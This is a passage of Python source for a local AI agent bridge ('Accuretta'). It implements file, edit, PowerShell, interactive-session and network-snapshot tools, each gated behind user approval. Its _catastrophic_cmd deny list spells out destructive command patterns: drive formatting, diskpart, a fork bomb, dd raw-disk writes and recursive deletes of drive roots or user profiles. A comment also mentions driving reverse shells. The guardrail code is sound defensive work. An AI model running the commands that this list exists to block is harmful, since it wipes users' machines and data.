            if byte_count + line_bytes > BYTE_CAP and chunk_parts:
                break
            chunk_parts.append(lines[i])
            byte_count += line_bytes
            end = i + 1
        chunk = "".join(chunk_parts)
        truncated = end < total_lines
        out: dict = {
            "path": path,
            "content": chunk,
            "offset": offset,
            "lines_returned": end - offset,
            "total_lines": total_lines,
            "size": total_size,
            "truncated": truncated,
        }
        if truncated:
            out["next_offset"] = end
            out["hint"] = (
                f"This is the COMPLETE, untruncated chunk for lines {offset}-{end - 1} "
                f"of {total_lines}. To read the next chunk, call read_file with "
                f"offset={end}. To jump straight to the part you need instead of "
                f"paging, call grep_files (search for a string) or read_skeleton "
                f"(code structure/signatures). Retrying with the same args returns "
                f"the same bytes — the file is fixed on disk."
            )
        return out
    except Exception as e:
        return {"error": str(e)}

def _run_linter(path: str) -> str:
    """Run a fast linter on the file. Returns error message if failed, empty string if passed."""
    import subprocess
    ext = os.path.splitext(path)[1].lower()
    
    if ext == ".py":
        try:
            res = subprocess.run(["flake8", "--isolated", "--select=E9,F821,F822,F823", path], capture_output=True, text=True, timeout=5)
            if res.returncode != 0:
                return f"flake8 syntax/name error:\n{res.stdout.strip()}"
        except Exception:
            pass
            
    elif ext in [".js", ".jsx", ".ts", ".tsx"]:
        dirpath = os.path.dirname(path)
        has_pkg = False
        while dirpath and dirpath != os.path.dirname(dirpath):
            if os.path.isfile(os.path.join(dirpath, "package.json")):
                has_pkg = True
                break
            dirpath = os.path.dirname(dirpath)
            
        if has_pkg:
            try:
                cmd = ["npx", "--no", "eslint", path]
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if res.returncode != 0:
                    return f"eslint error:\n{res.stdout.strip()}"
            except Exception:
                pass
    return ""


def tool_write_file(args: dict) -> dict:
    path = normalize_path(args.get("path") or "")
    content = args.get("content", "")
    if not path:
        return {"error": "missing path"}
    if is_bridge_self_path(path):
        return {"error": "refused: bridge.py is the running server — edit it from your real IDE, not from a chat tool call. Restart the bridge afterward."}
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    if not is_in_workspace(path):
        return {"error": "path outside workspace. Add folder in Workspace panel."}
    if is_ignored(path):
        return {"error": f"path ignored by .accurettaignore: {path}"}
    # Anti-clobber: refuse a full overwrite of an existing file the model hasn't
    # read this session (or that changed since it read) — it would be writing
    # from a stale mental model. read_file first, or pass force=true to override.
    if os.path.isfile(path) and not bool(args.get("force")):
        stale = _file_staleness(path)
        if stale:
            return {"error": (f"write blocked: this file exists and was {stale}. Call read_file on it "
                              f"first so you overwrite the CURRENT contents, not a stale assumption — "
                              f"then write_file again. If you truly mean to replace the whole file, pass "
                              f"force=true."),
                    "path": path, "reason": stale}
    # Rewrite-loop breaker: refuse the Nth full rewrite of the same file in a
    # single turn. The model can't verify a fresh version is actually better, so
    # it spirals ("this is a mess, let me rewrite from scratch") forever. Force
    # it into targeted edits instead.
    _npath = normalize_path(path)
    _prior = _write_count(_npath)
    if os.path.isfile(path) and _prior >= REWRITE_LOOP_LIMIT and not bool(args.get("force_rewrite")):
        return {"error": (f"rewrite loop blocked: you have already rewritten this file {_prior} time(s) this "
                          f"turn and it IS saved. STOP rewriting from scratch — you cannot verify a fresh "
                          f"version is better and you are spiralling. Instead: if a SPECIFIC thing is wrong, "
                          f"fix that one thing with edit_file; otherwise the file is DONE — tell the user it's "
                          f"ready. Only pass force_rewrite=true with a concrete reason (e.g. a real syntax error)."),
                "path": path, "rewrites_this_turn": _prior}
    approval = request_approval(
        title="Write file",
        command=f'Set-Content -Path "{path}" -Value <{len(content)} chars>',
        details={"kind": "write_file", "path": path, "bytes": len(content.encode('utf-8'))},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied write ({approval.get('status')})"}
    try:
        old_text = ""
        if os.path.isfile(path):
            try:
                old_text = Path(path).read_text(encoding="utf-8")
            except Exception:
                pass
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        Path(path).write_text(content, encoding="utf-8")
        _record_file_read(path)  # our hash now matches what we just wrote
        _record_write(_npath)    # count this rewrite for the loop-breaker

        import difflib
        diff = list(difflib.unified_diff(
            old_text.splitlines(keepends=True),
            content.splitlines(keepends=True),
            n=0
        ))
        added = 0
        deleted = 0
        for line in diff:
            if line.startswith('+') and not line.startswith('+++'):
                added += 1
            elif line.startswith('-') and not line.startswith('---'):
                deleted += 1
                
        lint_err = _run_linter(path)
        if lint_err:
            return {"error": f"File written, BUT linter found errors. Please fix them immediately:\n{lint_err}"}

        result = {"ok": True, "path": path, "bytes": len(content.encode("utf-8")), "added": added, "deleted": deleted}
        if _write_count(_npath) >= 2:
            result["warning"] = ("you have now rewritten this file from scratch. If it still isn't right, make a "
                                 "TARGETED edit_file fix next — do NOT rewrite the whole file again, you'll spiral.")
        return result
    except Exception as e:
        return {"error": str(e)}


def tool_edit_file(args: dict) -> dict:
    """Apply surgical search-and-replace edits to an existing file.
    Each edit finds old_text and replaces it with new_text.
    old_text must be unique or an exact single match — ambiguous matches are rejected.
    """
    path = normalize_path(args.get("path") or "")
    edits = args.get("edits") or []
    if not path:
        return {"error": "missing path"}
    if not isinstance(edits, list) or not edits:
        return {"error": "edits must be a non-empty list of {old_text, new_text}"}
    if is_bridge_self_path(path):
        return {"error": "refused: bridge.py is the running server — edit it from your real IDE, not from a chat tool call. Restart the bridge afterward."}
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    if not is_in_workspace(path):
        return {"error": "path outside workspace. Add folder in Workspace panel."}
    if is_ignored(path):
        return {"error": f"path ignored by .accurettaignore: {path}"}
    if not os.path.isfile(path):
        return {"error": f"not a file: {path}"}

    try:
        text = Path(path).read_text(encoding="utf-8")
    except Exception as e:
        return {"error": f"read failed: {e}"}

    applied = []
    errors = []
    modified = text

    for i, edit in enumerate(edits):
        old = edit.get("old_text", "")
        new = edit.get("new_text", "")
        if not old:
            errors.append(f"edit {i}: old_text is empty")
            continue

        count = modified.count(old)
        if count == 0:
            # try stripping common surrounding whitespace for a fuzzy match
            old_stripped = old.strip()
            if old_stripped and old_stripped != old:
                count = modified.count(old_stripped)
                if count == 1:
                    modified = modified.replace(old_stripped, new, 1)
                    applied.append({"edit": i, "match": "fuzzy", "old": old[:60], "new": new[:60]})
                    continue
                elif count > 1:
                    errors.append(f"edit {i}: fuzzy match '{old[:40]}' appears {count} times — ambiguous")
                    continue
            errors.append(f"edit {i}: '{old[:40]}' not found in file")
            continue
        elif count > 1:
            errors.append(f"edit {i}: '{old[:40]}' appears {count} times — must be unique")
            continue
        else:
            modified = modified.replace(old, new, 1)
            applied.append({"edit": i, "match": "exact", "old": old[:60], "new": new[:60]})

    if errors:
        return {
            "error": "; ".join(errors),
            "applied": len(applied),
            "failed": len(errors),
            "path": path,
        }

    # approval: show a diff-like summary
    diff_lines = []
    for a in applied:
        diff_lines.append(f"- {a['old'][:50]}")
        diff_lines.append(f"+ {a['new'][:50]}")
    preview = "\n".join(diff_lines) if diff_lines else "(no preview)"
    approval = request_approval(
        title="Edit file",
        command=f'edit {len(applied)} location(s) in "{path}"',
        details={"kind": "edit_file", "path": path, "edits": len(applied), "preview": preview},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied edit ({approval.get('status')})"}

    try:
        import difflib
        diff = list(difflib.unified_diff(
            text.splitlines(keepends=True),
            modified.splitlines(keepends=True),
            n=0
        ))
        added = 0
        deleted = 0
        for line in diff:
            if line.startswith('+') and not line.startswith('+++'):
                added += 1
            elif line.startswith('-') and not line.startswith('---'):
                deleted += 1

        Path(path).write_text(modified, encoding="utf-8")
        _record_file_read(path)  # keep our hash current after our own edit

        lint_err = _run_linter(path)
        if lint_err:
            return {"error": f"Edit applied, BUT linter found errors. Please fix them immediately:\n{lint_err}"}
            
        return {
            "ok": True,
            "path": path,
            "edits_applied": len(applied),
            "bytes": len(modified.encode("utf-8")),
            "added": added,
            "deleted": deleted,
        }
    except Exception as e:
        return {"error": str(e)}

def tool_replace_ast_node(args: dict) -> dict:
    """Surgical AST-based replacement. Provide path, node_type, node_name, and new_text."""
    path = normalize_path(args.get("path") or "")
    node_type = args.get("node_type") or ""
    node_name = args.get("node_name") or ""
    new_text = args.get("new_text", "")
    
    if not path or not node_type or not node_name or not new_text:
        return {"error": "Missing required arguments: path, node_type, node_name, new_text"}
        
    ext = os.path.splitext(path)[1].lower()
    try:
        import tree_sitter
    except ImportError:
        return {"error": "tree-sitter is not installed. Please pip install tree-sitter"}
        
    lang_module = None
    if ext == ".py":
        try:
            import tree_sitter_python
            lang_module = tree_sitter_python.language()
        except ImportError:
            pass
    elif ext in [".js", ".jsx"]:
        try:
            import tree_sitter_javascript
            lang_module = tree_sitter_javascript.language()
        except ImportError:
            pass
    elif ext in [".ts", ".tsx"]:
        try:
            import tree_sitter_typescript
            lang_module = tree_sitter_typescript.language_typescript() if ext == ".ts" else tree_sitter_typescript.language_tsx()
        except ImportError:
            pass
            
    if not lang_module:
        return {"error": f"AST editing not supported for file extension {ext} or tree-sitter plugin missing"}
        
    try:
        lang = tree_sitter.Language(lang_module)
        parser = tree_sitter.Parser(lang)
    except Exception as e:
        return {"error": f"Failed to initialize tree-sitter parser: {e}"}
    
    try:
        source_bytes = Path(path).read_bytes()
    except Exception as e:
        return {"error": f"Failed to read file: {e}"}
        
    tree = parser.parse(source_bytes)
    
    found_node = None
    def traverse(node):
        nonlocal found_node
        if found_node:
            return
        if node.type == node_type:
            name_node = node.child_by_field_name('name')
            if name_node and name_node.text.decode('utf8') == node_name:
                found_node = node
                return
            for child in node.children:
                if child.type == 'identifier' and child.text.decode('utf8') == node_name:
                    found_node = node
                    return
        for child in node.children:
            traverse(child)
            
    traverse(tree.root_node)
    
    if not found_node:
        return {"error": f"Could not find node of type '{node_type}' with name '{node_name}'"}
        
    start = found_node.start_byte
    end = found_node.end_byte
    
    new_bytes = source_bytes[:start] + new_text.encode('utf8') + source_bytes[end:]
    
    approval = request_approval(
        title="AST Replace",
        command=f'Replace {node_type} {node_name} in {os.path.basename(path)}',
        details={"kind": "replace_ast_node", "path": path, "preview": new_text[:200] + "..."},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied edit ({approval.get('status')})"}
        
    Path(path).write_bytes(new_bytes)
    
    lint_err = _run_linter(path)
    if lint_err:
        return {"error": f"AST replaced, BUT linter found errors. Please fix them immediately:\n{lint_err}"}
        
    return {"ok": True, "path": path, "replaced_node": node_name}


def tool_find_references(args: dict) -> dict:
    """Find deterministic references to a symbol using AST."""
    symbol = args.get("symbol") or ""
    if not symbol:
        return {"error": "Missing symbol string"}
        
    import tree_sitter
    try:
        import tree_sitter_python
        lang_py = tree_sitter.Language(tree_sitter_python.language())
    except ImportError:
        lang_py = None
        
    try:
        import tree_sitter_javascript
        lang_js = tree_sitter.Language(tree_sitter_javascript.language())
    except ImportError:
        lang_js = None
        
    try:
        import tree_sitter_typescript
        lang_ts = tree_sitter.Language(tree_sitter_typescript.language_typescript())
        lang_tsx = tree_sitter.Language(tree_sitter_typescript.language_tsx())
    except ImportError:
        lang_ts = None
        lang_tsx = None
        
    hits = []
    folders = get_workspace().get("folders", [])
    if not folders:
        return {"error": "No workspace folders configured"}
        
    target_bytes = symbol.encode('utf8')
        
    for folder in folders:
        for root, dirs, files in os.walk(folder):
            dirs[:] = [d for d in dirs if not is_ignored(os.path.join(root, d))]
            for fname in files:
                fpath = os.path.join(root, fname)
                if is_ignored(fpath):
                    continue
                    
                ext = os.path.splitext(fname)[1].lower()
                lang = None
                if ext == ".py":
                    lang = lang_py
                elif ext in [".js", ".jsx"]:
                    lang = lang_js
                elif ext == ".ts":
                    lang = lang_ts
                elif ext == ".tsx":
                    lang = lang_tsx
                    
                if not lang:
                    continue
                    
                try:
                    content = Path(fpath).read_bytes()
                except Exception:
                    continue
                    
                if target_bytes not in content:
                    continue
                    
                try:
                    parser = tree_sitter.Parser(lang)
                    tree = parser.parse(content)
                except Exception:
                    continue
                
                code_lines = content.decode('utf8', errors='replace').splitlines()
                
                def traverse(node):
                    if len(node.children) == 0 and node.text == target_bytes:
                        line_start = node.start_point[0]
                        if line_start < len(code_lines):
                            hits.append({
                                "file": fpath,
                                "line": line_start + 1,
                                "code": code_lines[line_start].strip()
                            })
                    for child in node.children:
                        traverse(child)
                traverse(tree.root_node)
                
    unique_hits = []
    seen = set()
    for h in hits:
        k = (h["file"], h["line"])
        if k not in seen:
            seen.add(k)
            unique_hits.append(h)
            
    return {"symbol": symbol, "matches": unique_hits[:100]}


def tool_delete_file(args: dict) -> dict:
    path = normalize_path(args.get("path") or "")
    if not path or not os.path.exists(path):
        return {"error": f"not found: {path}"}
    if is_bridge_self_path(path):
        return {"error": "refused: bridge.py is the running server — won't delete the file backing this process."}
    if is_blocked_path(path):
        return {"error": "path blocked (Windows/System32)"}
    if not is_in_workspace(path):
        return {"error": "path outside workspace"}
    approval = request_approval(
        title="Delete",
        command=f'Remove-Item -Path "{path}" -Recurse -Force',
        details={"kind": "delete", "path": path, "dir": os.path.isdir(path)},
    )
    if approval.get("decision") != "approve":
        return {"error": f"user denied delete ({approval.get('status')})"}
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        return {"ok": True, "path": path}
    except Exception as e:
        return {"error": str(e)}


def _emit_tool_stream(name: str, text: str) -> None:
    """If a chat turn is active, emit a tool_stream SSE event."""
    cid = _current_chat_id.get()
    emit = _chat_emitters.get(cid) if cid else None
    if emit:
        try:
            emit({"type": "tool_stream", "name": name, "text": text[:240]})
        except Exception:
            pass


_cmd_history_lock = threading.Lock()


def _append_cmd_history(entry: dict) -> None:
    """Append a single PowerShell-call record to cmd_history.jsonl, then trim
    the file to CMD_HISTORY_MAX lines if it's grown past that. Failures are
    swallowed — command logging must never block a tool call from returning."""
    try:
        DATA.mkdir(parents=True, exist_ok=True)
        with _cmd_history_lock:
            with open(CMD_HISTORY_FILE, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry, ensure_ascii=False, default=str) + "\n")
            # Cheap rotation: rewrite the file if it's too long. Reads the
            # whole file (it's capped, so a few hundred KB at worst) and
            # keeps the trailing CMD_HISTORY_MAX entries.
            try:
                with open(CMD_HISTORY_FILE, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                if len(lines) > CMD_HISTORY_MAX + 200:  # only rotate when meaningfully over
                    keep = lines[-CMD_HISTORY_MAX:]
                    with open(CMD_HISTORY_FILE, "w", encoding="utf-8") as f:
                        f.writelines(keep)
            except Exception:
                pass
    except Exception:
        pass


def _read_cmd_history(limit: int = 200, chat_id: str = "") -> list[dict]:
    """Return the last `limit` history entries, newest first. Optionally
    filter to entries that ran in a specific chat."""
    if not CMD_HISTORY_FILE.exists():
        return []
    out: list[dict] = []
    try:
        with _cmd_history_lock:
            with open(CMD_HISTORY_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
    except Exception:
        return []
    for line in lines:
        line = line.strip()
        if not line:
            continue
        try:
            entry = json.loads(line)
        except Exception:
            continue
        if chat_id and entry.get("chat_id") != chat_id:
            continue
        out.append(entry)
    out.reverse()
    return out[:limit]


def _run_powershell(cmd: str, timeout: int = 120, max_stdout: int = 16000) -> dict:
    t_start = time.time()
    try:
        proc = subprocess.Popen(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
    except Exception as e:
        err = {"error": str(e)}
        _append_cmd_history({
            "ts": int(t_start * 1000),
            "chat_id": _get_current_chat(),
            "command": cmd,
            "exit": -1,
            "ok": False,
            "duration_ms": int((time.time() - t_start) * 1000),
            "stdout": "",
            "stderr": str(e),
            "spawn_error": True,
        })
        return err

    out_lines: list[str] = []
    err_lines: list[str] = []

    def reader(pipe, sink, name):
        try:
            for line in iter(pipe.readline, ""):
                sink.append(line)
                _emit_tool_stream(name, line.rstrip("\n\r"))
            pipe.close()
        except Exception:
            pass

    t_out = threading.Thread(target=reader, args=(proc.stdout, out_lines, "run_powershell"), daemon=True)
    t_err = threading.Thread(target=reader, args=(proc.stderr, err_lines, "run_powershell"), daemon=True)
    t_out.start()
    t_err.start()

    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        _append_cmd_history({
            "ts": int(t_start * 1000),
            "chat_id": _get_current_chat(),
            "command": cmd,
            "exit": -1,
            "ok": False,
            "duration_ms": int((time.time() - t_start) * 1000),
            "stdout": "".join(out_lines)[-max_stdout:],
            "stderr": "".join(err_lines)[-4000:],
            "timed_out": True,
        })
        return {"error": f"timeout after {timeout}s"}

    t_out.join(timeout=5)
    t_err.join(timeout=5)

    stdout = "".join(out_lines)[-max_stdout:]
    stderr = "".join(err_lines)[-4000:]
    result = {
        "ok": proc.returncode == 0,
        "exit": proc.returncode,
        "stdout": stdout,
        "stderr": stderr,
    }
    _append_cmd_history({
        "ts": int(t_start * 1000),
        "chat_id": _get_current_chat(),
        "command": cmd,
        "exit": proc.returncode,
        "ok": result["ok"],
        "duration_ms": int((time.time() - t_start) * 1000),
        "stdout": stdout,
        "stderr": stderr,
    })
    return result


def _catastrophic_cmd(cmd: str) -> str | None:
    """Refuse — not merely prompt — commands that would wipe the machine or the
    user's data: whole-drive/profile recursive deletes, disk format/wipe, fork
    bombs, raw-disk overwrites. Deliberately NARROW so a normal 'delete this
    build folder' still flows through the usual approval, not a hard block.
    Returns a short reason if catastrophic, else None."""
    if not cmd:
        return None
    c = " ".join(cmd.lower().split())   # collapse whitespace so patterns stay simple
    standalone = [
        (r"\bformat\s+[a-z]:", "formats a drive"),
        (r"\bdiskpart\b", "runs diskpart (can wipe partitions)"),
        (r"\b(clear-disk|format-volume|remove-partition|initialize-disk)\b", "destroys a disk or partition"),
        (r"\bcipher\s+/w", "wipes free space (cipher /w)"),
        (r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", "is a fork bomb"),
        (r"\bdd\b.*\bof=/dev/(sd|nvme|hd|disk)", "raw-writes a disk device (dd)"),
        (r"\bmkfs\.", "formats a filesystem (mkfs)"),
        (r">\s*/dev/(sd|nvme|hd)[a-z0-9]", "overwrites a raw disk device"),
    ]
    for pat, why in standalone:
        if re.search(pat, c):
            return why
    recurse_delete = bool(
        re.search(r"remove-item\b.*\brecurse\b.*\bforce\b", c)
        or re.search(r"remove-item\b.*\bforce\b.*\brecurse\b", c)
        or re.search(r"\brm\s+-\w*r\w*f\b|\brm\s+-\w*f\w*r\b", c)
        or re.search(r"\b(rd|rmdir)\s+/s\b", c)
        or re.search(r"\bdel\s+/s\b", c)
    )
    if recurse_delete:
        targets = [
            r"\s[a-z]:\\?(?:$|\s|['\"|&;])",            # a bare drive root, e.g. C:\
            r"[a-z]:\\windows\b",                       # C:\Windows
            r"[a-z]:\\users\b(?![\\a-z0-9])",           # the WHOLE C:\Users
            r"\$env:systemroot\b|\$env:windir\b",
            r"\$env:userprofile(?![\\a-z0-9])|\$home(?![\\/\w])",
            r"\brm\s+-\w+\s+/\s*(?:$|\*)",              # rm -rf /  or  rm -rf /*
            r"\brm\s+-\w+\s+~\s*(?:$|/\*)",             # rm -rf ~  or  rm -rf ~/*
            r"/mnt/[a-z](?![/\w])",                     # a Windows drive mounted in WSL, e.g. /mnt/c
            r"/mnt/[a-z]/\*",                           # /mnt/c/*  — everything on the drive
            r"/mnt/[a-z]/users(?![/\w])",               # the whole Users tree via WSL
        ]
        for pat in targets:
            if re.search(pat, c):
                return "would recursively force-delete a drive root, Windows, or your whole profile"
    return None


def tool_run_powershell(args: dict) -> dict:
    cmd = (args.get("command") or "").strip()
    if not cmd:
        return {"error": "empty command"}
    threat = bridge_self_threat(cmd)
    if threat:
        return {
            "error": (
                f"refused: {threat}. Accuretta won't terminate or overwrite its own "
                "server through a tool call — restart the bridge yourself if you "
                "really mean to. If you're trying to kill a different python "
                "process (flask dev server, etc.), target it by exact PID rather "
                "than 'all python.exe' or 'whatever listens on 8787'."
            ),
            "refused_command": cmd,
        }
    catastrophic = _catastrophic_cmd(cmd)
    if catastrophic:
        return {
            "error": (
                f"refused: this command {catastrophic}. Accuretta hard-blocks "
                "whole-machine / whole-drive destruction — it never even reaches "
                "the approval queue. If you truly intend this, run it yourself."
            ),
            "refused_command": cmd,
            "catastrophic": True,
        }
    # Registry tier check runs BEFORE the generic powershell approval so
    # system-hive writes never even reach the approval queue. Refusal here
    # is the catastrophic-failure safeguard that prevents another "one rule
    # bricked the PC" incident.
    reg = registry_assess(cmd)
    if reg["level"] == "system":
        return {
            "error": (
                "refused: command writes to a SYSTEM registry hive "
                f"({', '.join(reg['targets']) or 'HKLM/HKCR/HKU'}). "
                "Accuretta hard-blocks these because a single bad value here "
                "can brick Windows. If this is genuinely intentional, do it "
                "manually in regedit with admin rights — no agent path."
            ),
            "refused_command": cmd,
            "registry_level": "system",
            "registry_targets": reg["targets"],
        }
    if reg["level"] == "user":
        # Loud REGISTRY EDIT approval card with hold-to-approve on the
        # frontend. Detail keys travel via details["targets"] so the card
        # can render them as a prominent list.
        approval = request_approval(
            title="REGISTRY EDIT (user hive)",
            command=cmd,
            details={"kind": "registry", "level": "user", "targets": reg["targets"]},
        )
        if approval.get("decision") != "approve":
            return {"error": f"user denied registry edit ({approval.get('status')})"}
    elif needs_approval(cmd):
        approval = request_approval(
            title="PowerShell (write/modify)",
            command=cmd,
            details={"kind": "powershell"},
        )
        if approval.get("decision") != "approve":
            return {"error": f"user denied command ({approval.get('status')})"}
    return _run_powershell(cmd, timeout=int(args.get("timeout", 120)))


# ---- interactive sessions --------------------------------------------------
# A long-lived child process the agent AND the user (via the shared Shell tab)
# can drive statefully — send input, read output, across many tool calls. This
# is what one-shot run_powershell can't do: it closes the gap for reverse
# shells, ssh, REPLs, debuggers, DB clients, and anything prompt-driven. Output
# is drained by a reader thread into a capped buffer with absolute offsets, so
# the model (its own cursor) and the UI (its own since=) can each tail it.
# v1 uses pipes, not a real PTY: line-based interaction works everywhere, but
# full-screen TUIs and TTY-only password prompts may misbehave (pywinpty later).
_SESSION_BUF_CAP = 200_000   # chars kept per session

class Session:
    def __init__(self, sid: str, command: str):
        self.id = sid
        self.command = command
        self.created = time.time()
        self._proc: Optional[subprocess.Popen] = None
        self._out = ""      # recent output (front-trimmed at the cap)
        self._base = 0      # absolute offset of _out[0] (chars already dropped)
        self._cursor = 0    # the model's read cursor (absolute)
        self._lock = threading.Lock()

    def start(self, cwd: Optional[str] = None) -> None:
        self._proc = subprocess.Popen(
            self.command,
            shell=True,
            cwd=cwd or None,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=1,
            encoding="utf-8",
            errors="replace",
            creationflags=(subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0),
        )
        threading.Thread(target=self._pump, name=f"session-{self.id}", daemon=True).start()

    def _append(self, text: str) -> None:
        with self._lock:
            self._out += text
            if len(self._out) > _SESSION_BUF_CAP:
                drop = len(self._out) - _SESSION_BUF_CAP
                self._out = self._out[drop:]
                self._base += drop

    def _pump(self) -> None:
        try:
            if not self._proc or not self._proc.stdout:
                return
            for line in iter(self._proc.stdout.readline, ""):
                self._append(line)
        except Exception:
            pass

    def alive(self) -> bool:
        return self._proc is not None and self._proc.poll() is None

    def exit_code(self):
        return None if self._proc is None else self._proc.poll()

    def send(self, text: str, enter: bool = True) -> bool:
        if not self.alive() or not self._proc or not self._proc.stdin:
            return False
        try:
            data = text + ("\n" if enter and not text.endswith("\n") else "")
            self._append(data if data.endswith("\n") else data + "\n")  # echo into the shared view
            self._proc.stdin.write(data)
            self._proc.stdin.flush()
            return True
        except Exception:
            return False

    def read_since(self, offset: int):
        with self._lock:
            start = max(0, offset - self._base)
            return self._out[start:], self._base + len(self._out)

    def read_model(self, cap: int = 12000) -> str:
        text, newcur = self.read_since(self._cursor)
        self._cursor = newcur
        if len(text) > cap:
            text = "… [earlier output truncated — read again for more] …\n" + text[-cap:]
        return text

    def stop(self) -> None:
        try:
            if self._proc and self._proc.poll() is None:
                self._proc.terminate()
        except Exception:
            pass

    def info(self) -> dict:
        return {"id": self.id, "command": self.command, "alive": self.alive(),
                "exit_code": self.exit_code(), "created": self.created}


class SessionManager:
    def __init__(self):
        self._sessions: dict[str, Session] = {}
        self._lock = threading.Lock()
        self._n = 0

    def create(self, command: str, cwd: Optional[str] = None) -> Session:
        with self._lock:
            self._n += 1
            sid = f"s{self._n}"
            s = Session(sid, command)
            self._sessions[sid] = s
        s.start(cwd=cwd)
        return s

    def get(self, sid: Optional[str]) -> Optional[Session]:
        with self._lock:
            return self._sessions.get(sid or "")

    def list(self) -> list:
        with self._lock:
            return [s.info() for s in self._sessions.values()]

    def stop(self, sid: str) -> bool:
        s = self.get(sid)
        if s:
            s.stop()
            return True
        return False

    def stop_all(self) -> None:
        with self._lock:
            sessions = list(self._sessions.values())
        for s in sessions:
            s.stop()


_session_mgr = SessionManager()


def _session_wait(ms) -> None:
    try:
        ms = int(ms)
    except Exception:
        ms = 600
    ms = max(0, min(ms, 6000))
    if ms:
        time.sleep(ms / 1000.0)


def tool_session_start(args: dict) -> dict:
    command = (args.get("command") or ("powershell" if sys.platform == "win32" else "bash")).strip()
    if not command:
        return {"error": "empty command"}
    threat = bridge_self_threat(command)
    if threat:
        return {"error": f"refused: {threat}", "refused_command": command}
    catastrophic = _catastrophic_cmd(command)
    if catastrophic:
        return {"error": f"refused: this command {catastrophic}. Run it yourself if you truly mean to.",
                "refused_command": command, "catastrophic": True}
    approval = request_approval(title="Interactive session", command=command, details={"kind": "session"})
    if approval.get("decision") != "approve":
        return {"error": f"user denied session ({approval.get('status')})"}
    s = _session_mgr.create(command, cwd=(args.get("cwd") or None))
    _session_wait(args.get("wait_ms", 600))
    return {
        "session_id": s.id, "alive": s.alive(), "output": s.read_model(),
        "note": "Interactive session started. Drive it with session_send (input=command), "
                "poll new output with session_read, and end it with session_stop.",
    }


def tool_session_send(args: dict) -> dict:
    sid = args.get("session_id") or args.get("id")
    s = _session_mgr.get(sid)
    if not s:
        return {"error": f"no such session: {sid}", "sessions": _session_mgr.list()}
    if not s.alive():
        return {"error": f"session {sid} has exited", "exit_code": s.exit_code()}
    text = args.get("input")
    if text is None:
        text = args.get("text", "")
    text = str(text)
    threat = bridge_self_threat(text)
    if threat:
        return {"error": f"refused: {threat}", "refused_input": text}
    catastrophic = _catastrophic_cmd(text)
    if catastrophic:
        return {"error": f"refused: this input {catastrophic}. Run it yourself if you truly mean to.",
                "refused_input": text, "catastrophic": True}
    if needs_approval(text):
        approval = request_approval(title="Session input (write/modify)", command=text,
                                    details={"kind": "session", "session_id": sid})
        if approval.get("decision") != "approve":
            return {"error": f"user denied input ({approval.get('status')})"}
    if not s.send(text, enter=bool(args.get("enter", True))):
        return {"error": "failed to write to session (it may have exited)", "alive": s.alive()}
    _session_wait(args.get("wait_ms", 700))
    return {"session_id": sid, "alive": s.alive(), "output": s.read_model()}


def tool_session_read(args: dict) -> dict:
    sid = args.get("session_id") or args.get("id")
    s = _session_mgr.get(sid)
    if not s:
        return {"error": f"no such session: {sid}", "sessions": _session_mgr.list()}
    _session_wait(args.get("wait_ms", 0))
    return {"session_id": sid, "alive": s.alive(), "exit_code": s.exit_code(), "output": s.read_model()}


def tool_session_stop(args: dict) -> dict:
    sid = args.get("session_id") or args.get("id")
    if not sid:
        return {"error": "session_id required", "sessions": _session_mgr.list()}
    return {"session_id": sid, "stopped": _session_mgr.stop(sid)}


def tool_session_list(args: dict) -> dict:
    return {"sessions": _session_mgr.list()}


_NETSNAP_PS = r"""
$ErrorActionPreference = 'SilentlyContinue'
$conns = Get-NetTCPConnection -State Established,Listen |
    Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
$udp = Get-NetUDPEndpoint |
    Select-Object LocalAddress, LocalPort, OwningProcess
$dns = Get-DnsClientCache |
    Where-Object { $_.Type -eq 'A' -or $_.Type -eq 'AAAA' -or $_.Type -eq 1 -or $_.Type -eq 28 } |
    Sort-Object TimeToLive -Descending |
    Select-Object -First 60 -Property Entry, Name, Type, TimeToLive
$procs = @{}
$ids = @($conns.OwningProcess) + @($udp.OwningProcess) | Sort-Object -Unique
foreach ($procId in $ids) {
    if (-not $procId) { continue }
    $p = Get-Process -Id $procId -ErrorAction SilentlyContinue
    if ($p) { $procs[[string]$procId] = $p.ProcessName }
}
@{
    tcp = @($conns)
    udp = @($udp)
    dns_cache = @($dns)
    processes = $procs
} | ConvertTo-Json -Depth 5 -Compress
"""


def _netsnap_debug_dump(stdout: str, stderr: str, exit_code=None, reason: str = "") -> str:
    """Write the raw PowerShell stdout/stderr to ./data/netsnap-debug.log so we
    can see exactly what came back when the JSON parse fails. Returns the path."""
    try:
        log_dir = (DATA_DIR if "DATA_DIR" in globals() else Path("data"))
        log_dir.mkdir(parents=True, exist_ok=True)
        path = log_dir / "netsnap-debug.log"
        sep = "=" * 70
        ts = time.strftime("%Y-%m-%d %H:%M:%S")
        body = (
            f"\n{sep}\n[{ts}]  reason={reason}  exit_code={exit_code}\n"
            f"--- stdout (len={len(stdout)}) ---\n{stdout}\n"
            f"--- stderr (len={len(stderr)}) ---\n{stderr}\n"
        )
        with open(path, "a", encoding="utf-8") as f:
            f.write(body)
        return str(path)
    except Exception as e:
        return f"<debug-dump failed: {e}>"


def tool_network_snapshot(args: dict) -> dict:
    """Snapshot the host's current network state (no admin, no install).
    Returns active TCP connections (with owning process names), UDP listeners,
    and the recent DNS resolver cache so the model can spot weird traffic."""
    if os.name != "nt":
        return {"error": "network_snapshot currently only supports Windows (uses Get-NetTCPConnection)"}
    approval = request_approval(
        title="Network snapshot",
